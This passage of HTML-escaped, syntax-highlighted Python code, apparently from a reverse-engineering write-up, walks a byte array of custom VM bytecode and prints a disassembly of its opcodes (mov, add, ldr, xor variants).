    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x02&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x01&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x05&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x01&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x04&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x05&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1B&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x05&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x22&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x04&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x08&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x01&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x04&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x04&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x05&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x01&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x05&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x09&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x01&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x09&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x09&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x01&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x05&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x07&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x08&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x05&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x08&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x09&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x08&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x05&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1B&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x05&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x27&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x04&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x07&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x01&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;
]

index &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
length &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; len(vm_code)
inloop &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; index &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; length:
    v22 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; vm_code[index]
    v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; vm_code[index &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
    v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; vm_code[index &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]
    v21 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; vm_code[index] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFE&lt;/span&gt;
    v20 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; vm_code[index] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v21 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: mov v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: mov v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        index &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; v21 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: mov32 v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: mov32 v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        index &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; v21 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: lea_ch v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#39;&lt;/span&gt;)
            index &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; v21 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: lea_int v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#39;&lt;/span&gt;)
        index &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; v21 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: ldr_int v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#39;&lt;/span&gt;)
        index &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; v21 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: ldr_ch v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#39;&lt;/span&gt;)
        index &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; v21 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: add v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: add v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        index &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; v21 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: add_pint v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: add_pint v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        index &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; v21 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: add_pch v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: add_pch v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        index &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; v21 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: my_xor v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
